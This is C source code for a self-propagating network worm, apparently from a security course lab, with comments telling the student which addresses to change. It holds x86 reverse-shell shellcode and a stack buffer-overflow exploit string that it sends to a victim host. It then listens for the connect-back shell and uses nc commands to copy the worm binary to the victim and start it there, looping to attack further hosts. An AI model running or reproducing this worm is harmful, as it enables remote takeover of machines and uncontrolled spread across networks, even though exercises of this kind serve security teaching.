#include <stdio.h>
#include<stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>     // for memcpy()
#define BUF_SIZE 1064
#define BUFFER_SIZE 1024
#define NAME_SIZE 2048
//Portbinding Shellcode
char shellcode[] =
  "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
  "\x06\x51\xb1\x01\x51\xb1\x02\x51"
  "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
  "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
  "\x68\x41\x42\x43\x44\x66\x68\xb0"
  "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
  "\x10\x53\x57\x52\x89\xe1\xb3\x03"
  "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
  "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
  "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
  "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
  "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
  "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
  "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
  "\x2f\x62\x69\x89\xe3\x50\x53\x89"
  "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
  "\x01\xcd\x80";

#define RET  0xbfffee98


int check_success(){
  char *p;
  p=(char *)getenv("SUCCESS");	
  if(p!=NULL && (int)p[0]=='Y')
    return 1;
  return 0;
}

int exploit(char *victimIP, unsigned short victimPort, char *conback_host, unsigned short conback_port){
  char buffer[1064];
  int s, i, size,j;

  struct sockaddr_in remote;

  //-------------Modify the shellcode to change the connect back IP address and port

  
  //the connect-back ip address is 192.168.122.237, you must modify it to "conback_host"
  shellcode[33] = 10; 
  shellcode[34] = 103;
  shellcode[35] = 133;
  shellcode[36] = 70;
  // the connect-back port is 4444= 17*256+92, you must modify it to conback_port 
  shellcode[39]=31;
  shellcode[40]=64;



  //--------------CREATE EXPLOIT STRING---------------------------------------

  // filling buffer with NOPs
  memset(buffer, 0x90, BUF_SIZE);
  //copying shellcode into buffer
  memcpy(buffer+901-sizeof(shellcode) , shellcode, sizeof(shellcode));
  // the previous statement causes a unintential Nullbyte at buffer[1000]
  buffer[900] = 0x90;
  // Copying the return address multiple times at the end of the buffer...
  for(i=905; i < BUF_SIZE-4; i+=4) { 
    * ((int *) &buffer[i]) = RET;
  }
  buffer[BUF_SIZE-1] = 0x0;



  // creating socket...
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
    {
      fprintf(stderr, "Error: Socket\n");
      return -1;
    }
  //state Protocolfamily , then converting the hostname or IP address, and getting  port number
  remote.sin_family = AF_INET;
  inet_aton(victimIP, &remote.sin_addr.s_addr);
  remote.sin_port = htons(victimPort);
  

  // connecting with destination host
  if (connect(s, (struct sockaddr *)&remote, sizeof(remote))==-1)
    {
      close(s);
      fprintf(stderr, "Error: connect\n");
      return 0;
    }

  for(i=0;i<10;i++)
    {	

      for(j=905; j < BUF_SIZE-4; j+=4) { 
	* ((int *) &buffer[j]) = RET; 
	//for every value of i, you should change the value of RET. Pay attention, if you the bad value of RET the server may crash
      }
      buffer[BUF_SIZE-1] = 0x0;


      //sending exploit string

      size = send(s, buffer, sizeof(buffer), 0);
      if (size==-1)
	{
	  close(s);
	  fprintf(stderr, "sending data failed\n");
	  return -1;
	}
      //check if the attack is success
  	
      sleep(5);
 
	
      if(check_success()){
	putenv("SUCCESS=N");
	close(s);
	return 1;
      }else{
	printf("exploit failed\n");
      }

    }

  // closing socket 
  close(s);

  return 0;
}




char* gethostipaddress(){

  char myname[100];       // name of this host
  struct hostent *hep;    // host entry pointer
  struct in_addr my_ip;   // IP of this host

  // get name of this host
  if (gethostname(myname, sizeof(myname)) != 0) {
    printf("gethostname() failed, exiting.\n");
    exit(1);
  }
  // now get full domain name and IP address
  if ((hep = gethostbyname(myname)) == NULL) {
    printf("gethostbyname() failed, exiting.\n");
    exit(2);
  }
  // grab copy of this host's IP to my_ip
  printf("The ip addrress is %s",hep->h_addr);

  memcpy(&my_ip, hep->h_addr, hep->h_length);
  return (char *)inet_ntoa(my_ip);
}


void *propagation( void *ptr )
{
  int s, c, cli_size;
  struct sockaddr_in srv, cli;
  char buffer[BUFFER_SIZE];
  int bytes;
  int i;


  printf("start the propagation engine...\n");

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s == -1)
    {
      perror("socket() failed");
      return ;
    }
  srv.sin_addr.s_addr = INADDR_ANY;
  srv.sin_port = htons( 4444);
  srv.sin_family = AF_INET;
  if (bind(s,(struct sockaddr*) &srv, sizeof(srv)) == -1)
    {
      perror("bind() failed");
      return ;
    }
  if (listen(s, 3) == -1)
    {
      perror("listen() failed");
      return ;
    }

  c = accept(s, (struct sockaddr*)&cli, &cli_size);
  if (c == -1)
    {
      perror("accept() failed");
      return ;
    }

  printf("got it...connect back from victim  \n");
  putenv("SUCCESS=Y");

  // Here, you coppy your worm from the localhost to the victim host. I put two examples
  // pwd and cp /home/pvhau/test1 /home/pvhau/test2


  memcpy(buffer, "pwd\x0A",4);
  bytes = send(c, buffer, 4, 0);

  if (bytes == -1)
    return;

  bytes = recv(c, buffer, sizeof(buffer), 0);
  if (bytes == -1)
    return ;

  buffer[bytes-1] = 0;    
  printf("Server %s is running at: %s\n",(char*)inet_ntoa(cli.sin_addr.s_addr), buffer);  



  memcpy(buffer, "nc -l 10000 >simpleworm\x0A",24);
  bytes = send(c, buffer, 24, 0);

  printf("worm is moving to the victim\n");
  sleep(10);

  system("nc 192.168.1.7 10000 <simpleworm");	

  
  memcpy(buffer, "./simpleworm&\x0A",14);
  bytes = send(c, buffer, 14, 0);
  

  if (bytes == -1)
    return ;

  close(c);

}

 
int main(int argc, char *argv[]) {
  pthread_t thread1;
  int iret;
  char conback_ip[16];
  unsigned short conback_port=4444, victim_port=5000;
 
  /* Create independent threads each of which will execute function */
  iret = pthread_create( &thread1, NULL, propagation, NULL);
  /* Wait till threads are complete before main continues. Unless we  */
  /* wait we run the risk of executing an exit which will terminate   */
  /* the process and all threads before the threads have completed.   */
  
 
  for(;;){
	
    //Choose victim: pick a random IP address in your LAN (192.168.2.0/24)
    //TO BE MODIFIED    
    char victim_address[]="192.168.1.7";//should be changed

    printf("Attack the victim %s...\n",victim_address);	
    strcpy(conback_ip,gethostipaddress());  

    //printf("The victim connects back to the IP address %s\n",conback_ip); 
    putenv("SUCCESS=N");
		 		
    //  if(exploit(victim_address,victim_port,conback_ip,conback_port)){//successfully exploited
    if(exploit(victim_address,victim_port,"192.168.122.237",conback_port)){//successfully exploited   
      printf("Successfully attacked\n");

      pthread_join( thread1, NULL);// you wait until the propagation is finished
      iret = pthread_create( &thread1, NULL, propagation, NULL);// create a new listener on port 4444


    }	 
     getchar();		
  }
}
